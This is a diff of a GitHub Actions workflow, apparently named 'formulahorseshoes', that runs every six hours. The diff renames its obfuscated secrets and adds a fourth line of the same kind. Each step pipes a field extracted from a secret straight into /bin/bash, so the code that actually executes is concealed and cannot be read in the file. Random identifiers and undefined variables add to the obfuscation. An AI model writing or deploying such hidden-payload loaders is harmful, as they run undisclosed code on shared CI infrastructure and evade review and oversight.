@@ -3,18 +3,19 @@ name: formulahorseshoes
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '35 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: formulahorseshoes
         env:
-          nf83: ${{ secrets.nf83 }}
+          kmfp0: ${{ secrets.kmfp0 }}
         run: |
-          echo $nf83 | jq -r .rmbwx94351 | /bin/bash
-          echo $dpp17 | jq -r .yudkk69253 | /bin/bash
-          echo $qqm4658 | jq -r .orno6 | /bin/bash
+          echo $kmfp0 | jq -r .j8495 | /bin/bash
+          echo $ypr88816 | jq -r .ijvpe2883 | /bin/bash
+          echo $znalo8511 | jq -r .lj5 | /bin/bash
+          echo $hilw4050 | jq -r .inq56 | /bin/bash
 
